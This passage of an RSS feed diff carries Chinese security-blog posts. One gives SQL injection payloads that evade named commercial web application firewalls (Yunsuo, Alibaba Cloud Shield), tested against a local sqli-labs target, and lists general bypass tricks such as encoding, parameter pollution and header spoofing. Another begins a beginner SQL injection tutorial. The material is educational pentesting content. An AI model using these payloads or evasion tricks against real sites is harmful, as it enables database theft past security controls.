+&lt;pre&gt;&lt;code&gt;and!!!substr((select&amp;#123;x username&amp;#125;from（users） limit 0,1),1,1)=&#39;D&#39;
+
+http://127.0.0.1/sqli/Less-1/?id=1%27 and!!!substr((select username from【users】 limit 0,1),3,1)=&#39;m&#39;-- +
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;联合&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;前面测试发现 内联注释不能使用了，只能靠括号之类的来干扰了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;union select   不拦截
+
+union select 1 拦截
+
+union(select 1) 不拦截
+
+union(select 1,2,3) 不拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;报错&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;and `updatexml`(1,select `user`%0a(),1) 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;2.4.1.png&#34; alt=&#34;mysql&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;2.4.2.png&#34; alt=&#34;mysql&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;阿里云的需要深度探索才能绕过，规则还是比较困难的，相对于安全狗，因为 edu 和 yq 的云盾好像版本不同，绕过的手法也要不一样，具体思路就是这样的，由于我直接在官网测试的，所以可能有点问题。&lt;/p&gt;
+&lt;h1 id=&#34;我与云锁有个约会&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#我与云锁有个约会&#34;&gt;#&lt;/a&gt; 我与云锁有个约会&lt;/h1&gt;
+&lt;h2 id=&#34;0x00-简单and探索&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-简单and探索&#34;&gt;#&lt;/a&gt; 0x00 简单 and 探索&lt;/h2&gt;
+&lt;p&gt;首先都是来测试下 and 的绕过&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;and 不拦截
+
+and 1 拦截
+
+and a 不拦截
+
+and &#39;a&#39; 不拦截
+
+and &#39;a&#39; &amp;gt; &amp;lt; =  拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;差不多知道他的规则了 绕过来就很简单了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select &#39;a&#39;-0;
++-------+
+| &#39;a&#39;-0 |
++-------+
+|     0 |
++-------+
+1 row in set, 1 warning (0.00 sec)
+
+mysql&amp;gt; select &#39;a&#39;+1;
++-------+
+| &#39;a&#39;+1 |
++-------+
+|     1 |
++-------+
+1 row in set, 1 warning (0.00 sec)
+
+mysql&amp;gt; select &#39;a&#39;|1;
++-------+
+| &#39;a&#39;|1 |
++-------+
+|     1 |
++-------+
+1 row in set, 1 warning (0.00 sec)
+
+
+and &#39;a&#39;-0  不拦截
+
+and &#39;a&#39;|1  不拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;0x01-我与云锁有个约会&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-我与云锁有个约会&#34;&gt;#&lt;/a&gt; 0x01 我与云锁有个约会&lt;/h2&gt;
+&lt;p&gt;早期云锁绕过非常简单，只需要在 post 和 get 同时提交数据 他会只检测 post 的内容，很轻松的绕过，但是更新后云锁也是很多人谈之色变的。&lt;/p&gt;
+&lt;p&gt;以下内容都是把云锁的增强型防护开启&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;简单的布尔盲注&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;and strcmp((substr((select user/**/()),2,1)),&#39;0&#39;)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;生僻函数绕过 这里比较难的点其实也在 from，但是比云盾好点，毕竟可以用到注释&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://192.168.130.135/Less-1/?id=1&#39;  and strcmp((substr((select from),2,1)),&#39;0&#39;)-- +  拦截
+
+http://192.168.130.135/Less-1/?id=1&#39;  and strcmp((substr((select /*from*/),2,1)),&#39;0&#39;)-- + 不拦截
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;看到这两条语句其实我们可以清楚的知道 &lt;code&gt;/**/&lt;/code&gt;  是我们可以利用的点，结合前面的知识我们只需要把我们的 from 放在注释里面然后把注释不起作用就 OK&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://192.168.130.135/Less-1/?id=1&#39;  and strcmp((substr((select password/* -- + %0afrom/**/users limit 0,1),1,1)),&#39;D&#39;)-- +
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;2.5.1.png&#34; alt=&#34;mysql&#34; /&gt;&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;时间盲注&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;时间盲注换换就行&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://192.168.130.135/Less-1/?id=1&#39;  and if((strcmp((substr((select password/* -- + %0afrom/**/users limit 0,1),1,1)),&#39;D&#39;)),1,sleep(5))-- +
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;报错注入&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;http://192.168.130.135/Less-1/?id=1&#39;  and `updatexml`(1,concat(0x7e,(select user/**/()),0x7e),1)/**/-- +
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其他的自己探索吧，bypass 也就一个知识量和思路的结合&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;2.5.2.png&#34; alt=&#34;mysql&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;0x00-拓展bypass的常用思路&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x00-拓展bypass的常用思路&#34;&gt;#&lt;/a&gt; 0x00 拓展 Bypass 的常用思路&lt;/h1&gt;
+&lt;p&gt;WAF 的绕过我们无非就是利用 WEB 程序缺陷，容器特性，网络协议，数据库特性来组合利用绕过，从用户发出请求到数据库的每一点，寻找突破口。&lt;/p&gt;
+&lt;h1 id=&#34;0x01-常见的手段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-常见的手段&#34;&gt;#&lt;/a&gt; 0x01 常见的手段&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;HTTP 协议&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;大小混写&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;替换&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;使用特殊字符&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;使用编码&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;等价替换&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;容器特性&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;白名单&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;缓冲溢出&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;等等&lt;/p&gt;
+&lt;h2 id=&#34;http协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http协议&#34;&gt;#&lt;/a&gt; HTTP 协议&lt;/h2&gt;
+&lt;p&gt;HTTP 协议中有很多功能，一般来说我们可以用到的就是编码功能，后来有大佬发现了分块传入来绕过 WAF，具体大家可以百度看看，大概 http 协议我们可以总结如下。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;构造畸形数据包&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;编码&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;分块&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;数据包溢出&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;可能有些表述有误，但是大概意思如此，构造畸形数据包的原理是 http 协议是有一定的容错性的，我们也常用这个容错性去绕过上传。编码绕过的原理也是利用程序解密，而 waf 识别不了，数据包溢出则是数据包过大 waf 自动丢弃不识别&lt;/p&gt;
+&lt;h2 id=&#34;大小混写&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#大小混写&#34;&gt;#&lt;/a&gt; 大小混写&lt;/h2&gt;
+&lt;p&gt;大小混写一般是绕过一些简单的正则 ，对大小写敏感的。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;UnIon SlEct 
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;替换&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#替换&#34;&gt;#&lt;/a&gt; 替换&lt;/h2&gt;
+&lt;p&gt;这种一般是因为正则吧我们的关键词给替换删除了，但是没有进行多次匹配导致绕过&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ununionion seselectlect
+
+un/**/ion se/**/lect
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;特殊字符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#特殊字符&#34;&gt;#&lt;/a&gt; 特殊字符&lt;/h2&gt;
+&lt;p&gt;特殊符号也多是数据库的特性，利用数据库可以使用多种符号来绕过，多种的运算符&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;`updatexml`
+
+and!!!1=1
+
+/**/
+
+/*!50000*/
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;使用编码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用编码&#34;&gt;#&lt;/a&gt; 使用编码&lt;/h2&gt;
+&lt;p&gt;这里和 http 协议差不多，多重编码等等，url 编码会自己解码一次，但是有的程序他可以自己多次解密，那么我们就可以拿来利用&lt;br /&gt;
+还有的程序参数他是支持 base64 的 那么我们的 payload 就可以编码绕过了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;= -&amp;gt; %3D -&amp;gt;%25%33%44
+
+and 1=1 -&amp;gt; YW5kIDE9MQ==
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;等价替换&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#等价替换&#34;&gt;#&lt;/a&gt; 等价替换&lt;/h2&gt;
+&lt;p&gt;mysql 众多的函数也我们的 bypass 带来了很对便利，比如一个分割字符串的函数都是几个，倘若被过滤一个可以换成其他的&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;substr(version(),1,1)
+Substring(version(),1,1)
+Left(version(),1)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;容器特性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#容器特性&#34;&gt;#&lt;/a&gt; 容器特性&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;iis&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;容器的特性给我们绕过非常的有帮助，感谢那些善于发现的师傅们。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;iis+asp 的%特性：当传入的 s%e%l%e%c%t 函数被%分割时，解析出来还是select
+iis+asp 的unicode特性 ： iis支持Unicode的解析 我们传入s%u0065lect解析为select
+
+    +--------------------------------------------------------------------+
+    |   Keywords     |        WAF             |  ASP/ASP.NET             |
+    +--------------------------------------------------------------------+
+    | sele%ct * fr%om..  | sele%ct * fr%om..      | select * from..      |
+    | ;dr%op ta%ble xxx  | ;dr%op ta%ble xxx      | ;drop table xxx      |
+    | &amp;lt;scr%ipt&amp;gt;      | &amp;lt;scr%ipt&amp;gt;                  | &amp;lt;script&amp;gt;             |
+    | &amp;lt;if%rame&amp;gt;      | &amp;lt;if%rame&amp;gt;                  | &amp;lt;iframe&amp;gt;             |
+    +--------------------------------------------------------------------+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;hpp&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;hpp 参数污染，前面我们绕过安全狗用到过，不同容器对我们传入的值解析顺序不同，这也是我们可以利用的&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    php+apache    &amp;amp;id=1&amp;amp;id=2     他只解析最后一个
+
+
+    +------------------------------------------------------------------+
+    | Web Server      | Parameter Interpretation         | Example     |
+    +------------------------------------------------------------------+
+    | ASP.NET/IIS     | Concatenation by comma       | par1=val1,val2  |
+    | ASP/IIS         | Concatenation by comma       | par1=val1,val2  |
+    | PHP/Apache      | The last param is resulting  | par1=val2       |
+    | JSP/Tomcat      | The first param is resulting | par1=val1       |
+    | Perl/Apache     | The first param is resulting | par1=val1       |
+    | DBMan           | Concatenation by two tildes  | par1=val1~~val2 |
+    +------------------------------------------------------------------+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;HTTP Parameter Contamination&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;不同的容器他会对我们的参数带入的一些特殊字符解析成不同的东西，比如&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    +-----------------------------------------------------------+
+    | Query String    |    Web Servers response / GET values    |
+    +-----------------------------------------------------------+
+    |         | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP             |
+    +-----------------------------------------------------------+
+    | ?test[1=2       | test_1=2             | test[1=2         |
+    | ?test=%         | test=%               | test=            |
+    | ?test%00=1      | test=1               | test=1           |
+    | ?test=1%001     | NULL                 | test=1           |
+    | ?test+d=1+2     | test_d=1 2           | test d=1 2       |
+    +-----------------------------------------------------------+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;白名单&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#白名单&#34;&gt;#&lt;/a&gt; 白名单&lt;/h2&gt;
+&lt;p&gt;有的程序他会对本地 ip 不拦截，同时他的 host 使用 &lt;code&gt;X-Forwarded-For&lt;/code&gt;  等来获取&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;X-Forwarded-For:127.0.0.1
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;缓冲溢出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#缓冲溢出&#34;&gt;#&lt;/a&gt; 缓冲溢出&lt;/h2&gt;
+&lt;p&gt;waf 他处理数据包的大小有限，早期安全狗你提交过长 url 会直接奔溃&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;参考文章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考文章&#34;&gt;#&lt;/a&gt; 参考文章&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Obfuscate and Bypass ： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vcGFwZXJzLzE3OTM0&#34;&gt;https://www.exploit-db.com/papers/17934&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;9 ways to bypass Web Application Firewall：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZGlnaXRhbG11bml0aW9uLm1lLzIwMTgvMDIvc3FsLWluamVjdGlvbi05LXdheXMtYnlwYXNzLXdlYi1hcHBsaWNhdGlvbi1maXJld2FsbC8=&#34;&gt;https://www.digitalmunition.me/2018/02/sql-injection-9-ways-bypass-web-application-firewall/&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;0x02-文末-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x02-文末-4&#34;&gt;#&lt;/a&gt; 0x02 文末&lt;/h1&gt;
+&lt;p&gt;bypass 不要局限与一种，多种组合才能最大利用，你需要了解 mysql 的语法，特殊的符号，特殊的写法，FUZZ 他可以容错的地方&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6SQLinjection/</guid>
+            <title>初学SQLinjection</title>
+            <link>https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6SQLinjection/</link>
+            <category>sql注入</category>
+            <pubDate>Wed, 02 Dec 2020 11:46:32 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;内容是网上收集的，可能存在错误&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;sqlinjection-原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sqlinjection-原理&#34;&gt;#&lt;/a&gt; SQLinjection 原理&lt;/h1&gt;
+&lt;p&gt;用户【可控参数】中注入 SQL 语法，破坏原有 SQL 结构，达到编写程序时意料之外结果的攻击行为。&lt;/p&gt;
+&lt;p&gt;其原因可以归结为以下两个原因叠加造成的：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;程序编写者在处理程序和数据库交互时，使用【字符串拼接】的方式构造 SQL 语句。&lt;/li&gt;
+&lt;li&gt;未对【用户可控参数】进行足够的过滤便将参数内容拼接到 SQL 查询语句中。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;sql注入的分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入的分类&#34;&gt;#&lt;/a&gt; SQL 注入的分类&lt;/h1&gt;
+&lt;p&gt;在《web 安全深度剖析》这本书中作者张炳帅前辈认为 SQL 注入只分为数字型与字符型，其他的注入不过是这两大类型的不同展现形式，或不同展现位置罢了。&lt;br /&gt;
+这些都是前辈们的总结&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;按变量类型分类&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;数字型&lt;/li&gt;
+&lt;li&gt;字符型&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;按 HTTP 提交方式分类&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;GET 注入&lt;/li&gt;
+&lt;li&gt;POST 注入&lt;/li&gt;
+&lt;li&gt;Cookie 注入&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;按注入方式分类&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;报错注入&lt;/li&gt;
+&lt;li&gt;盲注&lt;/li&gt;
+&lt;li&gt;布尔盲注&lt;/li&gt;
+&lt;li&gt;时间盲注&lt;/li&gt;
+&lt;li&gt;union 注入&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;编码问题&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;宽字节注入&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;mysql-50以上和mysql-50以下版本的区别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql-50以上和mysql-50以下版本的区别&#34;&gt;#&lt;/a&gt; MySQL 5.0 以上和 MySQL 5.0 以下版本的区别&lt;/h1&gt;
+&lt;p&gt;MySQL 5.0 以上版本存在一个存储着数据库信息的信息数据库 --INFORMATION_SCHEMA ，其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。而 5.0 以下没有。&lt;/p&gt;
+&lt;h2 id=&#34;information_schema-库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#information_schema-库&#34;&gt;#&lt;/a&gt; INFORMATION_SCHEMA 库&lt;/h2&gt;
+&lt;p&gt;系统数据库，记录当前数据库的数据库，表，列，用户权限等信息&lt;/p&gt;
+&lt;h3 id=&#34;schemata表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#schemata表&#34;&gt;#&lt;/a&gt; SCHEMATA 表&lt;/h3&gt;
+&lt;p&gt;储存 mysql 所有数据库的基本信息，包括数据库名，编码类型路径等&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;我们需要记住该表中记录数据库库名的字段名为 SCHEMA_NAME。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;tables表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tables表&#34;&gt;#&lt;/a&gt; TABLES 表&lt;/h3&gt;
+&lt;p&gt;储存 mysql 中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;我们需要记住该表中记录数据库名和表名的字段名分别为 TABLE_SCHEMA 和 TABLE_NAME。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;columns表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#columns表&#34;&gt;#&lt;/a&gt; COLUMNS 表&lt;/h3&gt;
+&lt;p&gt;储存 mysql 中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;我们需要记住该表中记录数据库库名、表名和字段名的字段名为 TABLE_SCHEMA、TABLE_NAME 和 COLUMN_NAME。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;常用的关于information_schema库的sql语句&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用的关于information_schema库的sql语句&#34;&gt;#&lt;/a&gt; 常用的关于 information_schema 库的 SQL 语句&lt;/h1&gt;
+&lt;p&gt;需要记住的几个函数&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;database ()：当前网站使用的数据库&lt;/li&gt;
+&lt;li&gt;version ()：当前 MySQL 的版本&lt;/li&gt;
+&lt;li&gt;user ()：当前 MySQL 的用户&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;limit 的用法&lt;br /&gt;
+ limit m,n 其中 m 是指记录开始的位置，从 0 开始，表示第一条记录；n 是指取 n 条记录。&lt;/p&gt;
+&lt;h2 id=&#34;查询数据表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询数据表&#34;&gt;#&lt;/a&gt; 查询数据表&lt;/h2&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt; union &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; table_name from information_schema.tables where &lt;span class=&#34;token assign-left variable&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;database&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt; union &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; from information_schema.tables where &lt;span class=&#34;token assign-left variable&#34;&gt;table_schema&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;database&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;mysql 的联合查询会把所有的查询结果返回到第一个查询的字段下，在注入过程中常让第一个查询结果错误，这样就只显示你联合查询的结果了&lt;/p&gt;
+&lt;h2 id=&#34;查询字段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查询字段&#34;&gt;#&lt;/a&gt; 查询字段&lt;/h2&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;union &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;,group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;column_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;,3,4 from information_schema.columns where &lt;span class=&#34;token assign-left variable&#34;&gt;table_name&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;你查询出来的表名&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;一句话总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一句话总结&#34;&gt;#&lt;/a&gt; 一句话总结&lt;/h2&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;查询数据表与表字段的时候会用到 information_schema 库&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;h1 id=&#34;sql注入的基本流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql注入的基本流程&#34;&gt;#&lt;/a&gt; SQL 注入的基本流程&lt;/h1&gt;
+&lt;h2 id=&#34;判断是否存在注入点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断是否存在注入点&#34;&gt;#&lt;/a&gt; 判断是否存在注入点&lt;/h2&gt;
+&lt;h2 id=&#34;判断注入类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#判断注入类型&#34;&gt;#&lt;/a&gt; 判断注入类型&lt;/h2&gt;
+&lt;h2 id=&#34;猜字段数量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#猜字段数量&#34;&gt;#&lt;/a&gt; 猜字段数量&lt;/h2&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;span&gt;h&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;order by &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;后面加数字是对查询的第几列排序，从而实现判断字段的个数的目的&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;迭代1~n,直到页面出错（也就是数据库报错了，里面没有这一列。）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;order by &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;  页面正常&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;order by &lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;  页面错误&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;共有6个字段&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;看看哪个字段回显&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#看看哪个字段回显&#34;&gt;#&lt;/a&gt; 看看哪个字段回显&lt;/h2&gt;
